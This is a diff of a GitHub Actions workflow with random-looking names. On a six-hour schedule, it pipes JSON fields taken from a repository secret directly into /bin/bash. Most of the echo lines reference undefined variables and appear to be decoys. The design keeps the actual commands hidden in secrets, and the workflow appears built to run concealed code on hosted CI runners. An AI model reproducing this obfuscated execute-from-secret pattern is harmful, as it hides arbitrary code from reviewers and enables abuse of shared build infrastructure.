@@ -1,10 +1,9 @@
 name: xiaozhumei5678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
-jobs:  # 28300
+    - cron: '27 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,22 +11,14 @@ jobs:  # 28300
       - uses: actions/checkout@v4
       - name: xiaozhumei5678
         env:
-          qo5: ${{ secrets.qo5 }}
+          rfrxy3383: ${{ secrets.rfrxy3383 }}
         run: |
-          echo $qo5 | jq -r .ig05865 | /bin/bash
-          echo $vow0871 | jq -r .qsuxk12156 | /bin/bash
-          echo $dkzw192 | jq -r .hhp1 | /bin/bash
-          echo $mh6711 | jq -r .bci060 | /bin/bash
-          echo $jymh73 | jq -r .wlra1 | /bin/bash
-          echo $vodpo9 | jq -r .yyn8 | /bin/bash
-          echo $ojt135 | jq -r .f04 | /bin/bash
-          echo $d0387 | jq -r .cnavr00 | /bin/bash
-          echo $sdr321 | jq -r .y7 | /bin/bash
-          echo $oybr0779 | jq -r .gns1 | /bin/bash
-          echo $bc35 | jq -r .vssyd44250 | /bin/bash
-          echo $c95 | jq -r .ys308 | /bin/bash
-          echo $fvmsc357 | jq -r .ubko1103 | /bin/bash
-          echo $x259 | jq -r .es02 | /bin/bash
-          echo $zdyp293 | jq -r .xh88633 | /bin/bash
-          echo $b01411 | jq -r .gsfq237 | /bin/bash
+          echo $rfrxy3383 | jq -r .pbkq7496 | /bin/bash
+          echo $di5162 | jq -r .orbn32952 | /bin/bash
+          echo $igqtk666 | jq -r .qpsyv04298 | /bin/bash
+          echo $dcjrz04914 | jq -r .u7 | /bin/bash
+          echo $dwh8877 | jq -r .ze685 | /bin/bash
+          echo $ubdym020 | jq -r .jhis74838 | /bin/bash
+          echo $q9 | jq -r .wdse5042 | /bin/bash
+          echo $hk453 | jq -r .gq0 | /bin/bash
 
